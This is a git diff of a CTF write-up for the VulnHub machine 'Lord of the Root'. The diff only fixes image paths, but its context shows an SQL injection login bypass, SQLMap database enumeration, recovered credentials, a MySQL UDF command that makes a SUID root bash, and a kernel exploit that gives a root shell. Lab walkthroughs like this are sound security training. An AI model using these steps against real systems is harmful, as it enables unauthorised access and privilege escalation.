@@ -2,10 +2,10 @@
 title: Lord of the Root 1.0.1
 categories: [Vulnhub, Linux]
 tags: [port-knocking,exploit/sqli/database-enum,linux-priv-esc/mysql,linux-priv-esc/kernel-exploit,bof/linux-bof]
-img_path: /Writeups/Vulnhub/Linux/Lord of the Root 1.0.1
+img_path: /Writeups/Vulnhub/Linux/Lord of the Root 1.0.1/images/
 pin: true
 image:
-  src: images/Lord of the Root 1.0.1.jpg
+  src: Lord of the Root 1.0.1.jpg
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
@@ -17,7 +17,7 @@ image:
 ## TCP/22 (SSH) 
 ### Port Knocking
 1. Connect to SSH
-	![](images/Pasted%20image%2020220125010651.png)
+	![](Pasted%20image%2020220125010651.png)
 	- Could be port knocking?
 2. Port Knock
 	```
@@ -113,12 +113,12 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 ## TCP/80 (HTTP) - SQLi (Blind) Database Enumeration
 1. View enumerated directories
 	- `index.html`
-		![](images/Pasted%20image%2020220125013623.png)
+		![](Pasted%20image%2020220125013623.png)
 	- `404.html`
-	![](images/Pasted%20image%2020220125014634.png)
+	![](Pasted%20image%2020220125014634.png)
 		- Hidden Text
 	- `images`
-		![](images/Pasted%20image%2020220125013837.png)
+		![](Pasted%20image%2020220125013837.png)
 2. Download all images & Analyze for hidden text/file
 	- Could not find any
 3. Decode hidden text
@@ -132,7 +132,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	```
 	- `/978345210/index.php`
 4. Proceed to `/978345210/index.php`
-	![](images/Pasted%20image%2020220125015001.png)
+	![](Pasted%20image%2020220125015001.png)
 5. Tried to bruteforce it, did not work
 6. [Try SQLi Payloads](https://github.com/payloadbox/sql-injection-payload-list)
 7. Try Time Based SQLi
@@ -144,8 +144,8 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	```
 	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 	```
-	![](images/Pasted%20image%2020220125023505.png)
-	![](images/Pasted%20image%2020220125030816.png)
+	![](Pasted%20image%2020220125023505.png)
+	![](Pasted%20image%2020220125030816.png)
 	- Successfully login, could not do anything w/ the login apge
 	- Instead of Authentication Bypass, we have to enumerate the database
 8. Run SQLMap
@@ -212,12 +212,12 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	```
 	- smeagol:MyPreciousR00t
 2. Access SSH w/ smeagol:MyPreciousR00t
-	![](images/Pasted%20image%2020220125041805.png)
+	![](Pasted%20image%2020220125041805.png)
 
 # Privilege Escalation 
 ## Root - Via MySQL running as Root
 1. Linpeas
-	![](images/Pasted%20image%2020220125042356.png)
+	![](Pasted%20image%2020220125042356.png)
 2. Check ASLR
 	```
 	smeagol@LordOfTheRoot:/SECRET/door1$ cat /proc/sys/kernel/randomize_va_space
@@ -231,7 +231,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	root      1183  0.0  0.8 327004  8748 ?        Ssl  16:31   0:11 /usr/sbin/mysqld
 	...
 	```
-	![](images/Pasted%20image%2020220125050305.png)
+	![](Pasted%20image%2020220125050305.png)
 	- `mysqld` running as root
 4. Find SQL Credentials
 	```
@@ -243,7 +243,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	```
 	- `/var/www/978345210/login.php`
 5. View `login.php`
-	![](images/Pasted%20image%2020220125050453.png)
+	![](Pasted%20image%2020220125050453.png)
 	- root:darkshadow
 6. Access mysql w/ root:darkshadow
 7. MySQL running as root exploit
@@ -289,7 +289,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 		```
 		select do_system('cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash');
 		```
-		![](images/Pasted%20image%2020220125162255.png)
+		![](Pasted%20image%2020220125162255.png)
 9. Check if `rootbash` exists
 	```
 	smeagol@LordOfTheRoot:/tmp$ ls -la
@@ -306,7 +306,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	smeagol@LordOfTheRoot:/tmp$ 
 	```
 10. Obtain root shell
-	![](images/Pasted%20image%2020220125162422.png)
+	![](Pasted%20image%2020220125162422.png)
 11. Flag
 	```
 	rootbash-4.3# cat Flag.txt 
@@ -318,7 +318,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 ## Root - Via Kernel Exploit
 
 1. Linpeas
-	![](images/Pasted%20image%2020220125174639.png)
+	![](Pasted%20image%2020220125174639.png)
 	- `3.19.0-25-generic`
 	- `Ubuntu 14.04`
 2. Find exploits for `3.19.0-25-generic, Ubuntu 14.04`
@@ -330,7 +330,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	smeagol@LordOfTheRoot:/tmp$ ./exploit
 	root@LordOfTheRoot:/tmp# 
 	```
-	![](images/Pasted%20image%2020220125180356.png)
+	![](Pasted%20image%2020220125180356.png)
 	
 ## Root - Via BufferOverflow
 - [Video Demo](https://youtu.be/qPBUKSKk5g4)
